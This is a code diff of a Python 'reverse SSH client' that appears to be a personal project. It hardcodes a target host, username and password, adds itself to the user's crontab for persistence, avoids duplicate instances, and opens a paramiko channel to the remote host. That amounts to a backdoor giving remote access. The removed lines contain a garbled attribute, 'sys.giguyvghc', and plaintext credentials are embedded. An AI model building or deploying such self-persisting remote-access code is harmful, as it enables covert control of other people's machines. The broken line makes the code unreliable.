@@ -1,16 +1,19 @@
-import sys
-
 import paramiko
 from os import popen,system
-import os.path
 from crontab import CronTab
 
-client_name = 'reverse_ssh_client.py'
-client_path = os.path.abspath(__file__)
+# host = input('Enter host: ')
+# port = int(input('Enter port: '))
+# username = input('Enter username: ')
+# password = input('Enter password: ')
 
-PORT = 22
-username = "aryeh"
-password = "pass"
+my_host = '192.168.1.197'
+my_port = 22
+my_username = 'aryehshebson'
+my_password = 'pass'
+
+client_name = 'reverse_ssh_client.py'
+client_path = '/home/aryeh/Desktop/reverse_ssh_client.py'
 
 def already_running(process):
     return popen('pgrep -af python').read().count(process+'\n') > 1
@@ -37,11 +40,6 @@ def create_channel(host,username,password,port):
     return channel
 
 if __name__ == '__main__':
-    #parse argv
-    if len(sys.argv) != 2:
-        print("Usage: python3 reverse_ssh_client.py [host]")
-        exit()
-    host = sys.giguyvghc[1]
     #check process isn't already running
     if already_running(client_name):
         print('already running')
@@ -50,7 +48,7 @@ if __name__ == '__main__':
     if client_name not in crontabs():
         add_to_crontabs(client_path)
     #connect client
-    channel = create_channel(host,username,password,PORT)
+    channel = create_channel(my_host,my_username,my_password,my_port)
     #start conversation
     channel.send('\n\n-------------------\n\nWelcome To SSH land\n\n-------------------\n\n> ')
     while True:
